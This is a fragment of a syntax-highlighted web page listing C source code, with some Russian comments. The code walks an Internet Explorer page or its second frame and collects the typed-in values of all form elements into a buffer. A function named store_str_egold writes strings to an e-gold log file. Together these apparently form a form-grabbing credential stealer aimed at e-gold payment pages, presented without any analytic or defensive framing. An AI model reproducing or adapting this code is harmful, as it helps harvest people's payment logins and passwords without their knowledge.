</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">grab_contens</span><span class="sc10">(</span><span class="sc11">IHTMLDocument2</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pHtmlDoc</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc10">){</span><span class="sc0">
    </span><span class="sc2">// Get HTML Document
</span><span class="sc0">    </span><span class="sc11">HRESULT</span><span class="sc0"> </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_OK</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc2">// Get number of frames
</span><span class="sc0">
    </span><span class="sc11">IHTMLFramesCollection2</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pFrames</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pHtmlDoc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pHtmlDoc</span><span class="sc10">-&gt;</span><span class="sc11">get_frames</span><span class="sc10">(&amp;</span><span class="sc11">pFrames</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">LONG</span><span class="sc0"> </span><span class="sc11">nFrames</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pFrames</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pFrames</span><span class="sc10">-&gt;</span><span class="sc11">get_length</span><span class="sc10">(&amp;</span><span class="sc11">nFrames</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc2">//printf("Frames: %d\n",nFrames);
</span><span class="sc0">
    </span><span class="sc2">// Get pointer to page contens
</span><span class="sc0">
    </span><span class="sc11">IHTMLElementCollection</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pCol</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// если фреймов 2, то nFrames будет равен 2
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">nFrames</span><span class="sc10">&gt;</span><span class="sc4">1</span><span class="sc10">){</span><span class="sc0">
        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_VARIANT</span><span class="sc0"> </span><span class="sc11">vFrame</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_VARIANT</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">vFrame</span><span class="sc10">.</span><span class="sc11">vt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">VT_UINT</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">vFrame</span><span class="sc10">.</span><span class="sc11">lVal</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">// получаем данные из 2 фрэйма!
</span><span class="sc0">        
        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pFrames</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">pFrames</span><span class="sc10">-&gt;</span><span class="sc11">item</span><span class="sc10">(&amp;</span><span class="sc11">vFrame</span><span class="sc10">,&amp;</span><span class="sc11">ret</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">IHTMLWindow2</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pWindow</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">ret</span><span class="sc10">.</span><span class="sc11">pdispVal</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">.</span><span class="sc11">pdispVal</span><span class="sc10">-&gt;</span><span class="sc11">QueryInterface</span><span class="sc10">(&amp;</span><span class="sc11">IID_IHTMLWindow2</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">**)&amp;</span><span class="sc11">pWindow</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">IHTMLDocument2</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pDoc</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pWindow</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">pWindow</span><span class="sc10">-&gt;</span><span class="sc11">get_document</span><span class="sc10">(&amp;</span><span class="sc11">pDoc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pDoc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">pDoc</span><span class="sc10">-&gt;</span><span class="sc11">get_all</span><span class="sc10">(&amp;</span><span class="sc11">pCol</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pHtmlDoc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pHtmlDoc</span><span class="sc10">-&gt;</span><span class="sc11">get_all</span><span class="sc10">(&amp;</span><span class="sc11">pCol</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">LONG</span><span class="sc0"> </span><span class="sc11">nElements</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pCol</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">pCol</span><span class="sc10">-&gt;</span><span class="sc11">get_length</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">nElements</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">j</span><span class="sc10">&lt;</span><span class="sc11">nElements</span><span class="sc10">;</span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">IDispatch</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pIDisp3</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_VARIANT</span><span class="sc0"> </span><span class="sc11">var_j</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">var_j</span><span class="sc10">.</span><span class="sc11">vt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">VT_I2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">var_j</span><span class="sc10">.</span><span class="sc11">intVal</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pCol</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pCol</span><span class="sc10">-&gt;</span><span class="sc11">item</span><span class="sc10">(</span><span class="sc11">var_j</span><span class="sc10">,</span><span class="sc11">var_j</span><span class="sc10">,&amp;</span><span class="sc11">pIDisp3</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">
        
        </span><span class="sc11">IHTMLElement</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pHtmlElement</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pIDisp3</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pIDisp3</span><span class="sc10">-&gt;</span><span class="sc11">lpVtbl</span><span class="sc10">-&gt;</span><span class="sc11">QueryInterface</span><span class="sc10">(</span><span class="sc11">pIDisp3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">IID_IHTMLElement</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">**)&amp;</span><span class="sc11">pHtmlElement</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">pHtmlElement</span><span class="sc10">){</span><span class="sc0">
            </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_VARIANT</span><span class="sc0"> </span><span class="sc11">varResult</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">BSTR</span><span class="sc0"> </span><span class="sc11">bsType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SysAllocString</span><span class="sc10">(</span><span class="sc11">L</span><span class="sc6">"value"</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pHtmlElement</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pHtmlElement</span><span class="sc10">-&gt;</span><span class="sc11">getAttribute</span><span class="sc10">(</span><span class="sc11">bsType</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">varResult</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">S_OK</span><span class="sc10">){</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">varResult</span><span class="sc10">.</span><span class="sc11">vt</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">VT_BSTR</span><span class="sc10">){</span><span class="sc0">
                    </span><span class="sc11">CHAR</span><span class="sc0"> </span><span class="sc11">szValue</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">varResult</span><span class="sc10">.</span><span class="sc11">bstrVal</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">){</span><span class="sc0">
                        </span><span class="sc11">wide2char</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">varResult</span><span class="sc10">.</span><span class="sc11">bstrVal</span><span class="sc10">,</span><span class="sc11">szValue</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szValue</span><span class="sc10">)+</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">))&lt;</span><span class="sc4">4090</span><span class="sc10">){</span><span class="sc0">
                            </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc11">szValue</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc2">//printf("%s\n",szValue);
</span><span class="sc0">                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc2">// end
</span><span class="sc0">    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">wide2char</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">wide_str</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">char_str</span><span class="sc10">){</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cnt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(*</span><span class="sc11">wide_str</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">cnt</span><span class="sc10">&lt;</span><span class="sc4">255</span><span class="sc10">){</span><span class="sc0">
        </span><span class="sc10">*</span><span class="sc11">char_str</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">wide_str</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">char_str</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc11">wide_str</span><span class="sc10">+=</span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">cnt</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">char_str</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">store_str_egold</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">str</span><span class="sc10">){</span><span class="sc0">
    </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">LOGFILE_EGOLD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ab"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">fp</span><span class="sc10">,</span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc11">str</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fp</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
